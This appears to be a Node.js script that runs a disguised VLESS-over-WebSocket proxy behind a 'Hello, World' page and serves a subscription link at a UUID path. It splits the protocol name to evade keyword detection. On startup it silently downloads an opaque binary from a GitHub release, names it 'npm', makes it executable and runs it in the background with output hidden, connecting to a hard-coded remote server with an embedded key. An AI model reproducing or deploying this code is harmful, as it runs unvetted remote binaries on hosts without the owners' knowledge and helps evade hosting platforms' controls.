const os = require('os');
const http = require('http');
const { Buffer } = require('buffer');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const net = require('net');
const { exec, execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const 哈哈哈 = (...args) => console.log.bind(this, ...args);
const 嘻嘻嘻 = (...args) => console.error.bind(this, ...args);
const 美好的一天 = process.env.UUID || 'b28f60af-d0b9-4ddf-baaa-7e49c93c380b';
const 彩虹桥 = 美好的一天.replace(/-/g, "");
const 服务器很棒 = process.env.NSERVER || 'data.xuexi365.eu.org';
const 端口很好 = process.env.NPORT || '443';        
const 密钥很牛 = process.env.NKEY || '8yYfiwf8QW0QTs5QON';             
const 域名超赞 = process.env.DOMAIN || '';  
const 名字不错 = process.env.NAME || 'ws';
const 监听端口 = process.env.SERVER_PORT || process.env.PORT || 3000;
// 分割关键词
const 协议前缀 = 'vl' + 'ess' + '://';
const 固定服务器 = 'ip.sb:443';
const 加密选项 = '?encryption=none&security=tls&sni=';
const 连接类型 = '&type=ws&host=';
const 路径配置 = '&path=%2F#';

// 创建HTTP路由
const 超级服务器 = http.createServer((req, res) => {
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello, World\n');
  } else if (req.url === `/${美好的一天}`) {
    // 如果DOMAIN未设置，则使用当前请求的host作为域名
    const 实际域名 = 域名超赞 || req.headers.host;
    
    let 订阅链接;
    
    if (域名超赞) {
      // DOMAIN已设置，使用原有逻辑
      订阅链接 = 协议前缀 + 美好的一天 + '@' + 固定服务器 + 加密选项 + 实际域名 + 连接类型 + 实际域名 + 路径配置 + 名字不错;
    } else {
      // DOMAIN未设置，使用当前网址作为服务器，security=none
      let 当前服务器 = req.headers.host;
      
      // 如果当前域名没有带端口，则添加:80
      if (!当前服务器.includes(':')) {
        当前服务器 = 当前服务器 + ':80';
      }
      
      const 无加密选项 = '?encryption=none&security=none&host=';
      const 原始域名 = req.headers.host; // host参数使用原始域名（不带端口）
      订阅链接 = 协议前缀 + 美好的一天 + '@' + 当前服务器 + 无加密选项 + 原始域名 + '&type=ws&path=%2F#' + 名字不错;
    }
    
    const 编码结果 = Buffer.from(订阅链接).toString('base64');

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(编码结果 + '\n');
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found\n');
  }
});

超级服务器.listen(监听端口, () => {
  console.log(`HTTP Server is running on port ${监听端口}`);
});

// 判断系统架构
function 检测系统架构() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的文件
function 获取远程文件(文件名称, 下载地址, 完成回调) {
  const 本地路径 = path.join("./", 文件名称);
  const 文件写入器 = fs.createWriteStream(本地路径);
  axios({
    method: 'get',
    url: 下载地址,
    responseType: 'stream',
  })
    .then(返回结果 => {
      返回结果.data.pipe(文件写入器);
      文件写入器.on('finish', function() {
        文件写入器.close();
        完成回调(null, 文件名称);
      });
    })
    .catch(出现错误 => {
      完成回调(`Download ${文件名称} failed: ${出现错误.message}`);
    });
}

function 批量下载文件() {
  const 当前架构 = 检测系统架构();
  const 文件列表 = 根据架构获取文件(当前架构);

  if (文件列表.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  let 完成数量 = 0;

  文件列表.forEach(文件详情 => {
    获取远程文件(文件详情.文件名称, 文件详情.下载地址, (err, fileName) => {
      if (err) {
        console.log(`Download ${fileName} failed`);
      } else {
        console.log(`Download ${fileName} successfully`);

        完成数量++;

        if (完成数量 === 文件列表.length) {
          setTimeout(() => {
            文件权限设置();
          }, 3000);
        }
      }
    });
  });
}

function 根据架构获取文件(架构名称) {
  if (架构名称 === 'arm') {
    return [
      { 文件名称: "npm", 下载地址: "https://github.com/eooce/test/releases/download/ARM/swith" },
    ];
  } else if (架构名称 === 'amd') {
    return [
      { 文件名称: "npm", 下载地址: "https://github.com/eooce/test/releases/download/bulid/swith" },
    ];
  }
  return [];
}

// 授权并运行程序
function 文件权限设置() {
  const 程序路径 = './npm';
  const 执行权限 = 0o775;
  fs.chmod(程序路径, 执行权限, (err) => {
    if (err) {
      console.error(`Empowerment failed:${err}`);
    } else {
      console.log(`Empowerment success:${执行权限.toString(8)} (${执行权限.toString(10)})`);

      // 运行程序
      let 安全连接 = '';
      if (服务器很棒 && 端口很好 && 密钥很牛) {
        if (端口很好 === '443') {
          安全连接 = '--tls';
        } else {
          安全连接 = '';
        }
        const 启动命令 = `./npm -s ${服务器很棒}:${端口很好} -p ${密钥很牛} ${安全连接} --skip-conn --disable-auto-update --skip-procs --report-delay 4 >/dev/null 2>&1 &`;
        try {
          exec(启动命令);
          console.log('npm is running');
        } catch (error) {
          console.error(`npm running error: ${error}`);
        }
      } else {
        console.log('Node variable is empty,skip running');
      }
    }
  });
}

// 只有当NSERVER存在时才下载和运行二进制文件
if (服务器很棒) {
  批量下载文件();
} else {
  console.log('NSERVER variable is empty, skip downloading and running binary files');
}

// WebSocket 服务器
const 套接字服务器 = new WebSocket.Server({ server: 超级服务器 });
套接字服务器.on('connection', ws => {
  console.log("WebSocket 连接成功");
  ws.on('message', 接收消息 => {
    if (接收消息.length < 18) {
      console.error("数据长度无效");
      return;
    }
    try {
      const [协议版本] = 接收消息;
      const 用户标识 = 接收消息.slice(1, 17);
      if (!用户标识.every((v, i) => v == parseInt(彩虹桥.substr(i * 2, 2), 16))) {
        console.error("UUID 验证失败");
        return;
      }
      let 当前位置 = 接收消息.slice(17, 18).readUInt8() + 19;
      const 目标端口 = 接收消息.slice(当前位置, 当前位置 += 2).readUInt16BE(0);
      const 地址格式 = 接收消息.slice(当前位置, 当前位置 += 1).readUInt8();
      const 目标主机 = 地址格式 === 1 ? 接收消息.slice(当前位置, 当前位置 += 4).join('.') :
        (地址格式 === 2 ? new TextDecoder().decode(接收消息.slice(当前位置 + 1, 当前位置 += 1 + 接收消息.slice(当前位置, 当前位置 + 1).readUInt8())) :
          (地址格式 === 3 ? 接收消息.slice(当前位置, 当前位置 += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
      console.log('连接到:', 目标主机, 目标端口);
      ws.send(new Uint8Array([协议版本, 0]));
      const 数据流 = createWebSocketStream(ws);
      net.connect({ host: 目标主机, port: 目标端口 }, function () {
        this.write(接收消息.slice(当前位置));
        数据流.on('error', err => console.error("E1:", err.message)).pipe(this).on('error', err => console.error("E2:", err.message)).pipe(数据流);
      }).on('error', err => console.error("连接错误:", err.message));
    } catch (err) {
      console.error("处理消息时出错:", err.message);
    }
  }).on('error', err => console.error("WebSocket 错误:", err.message));
});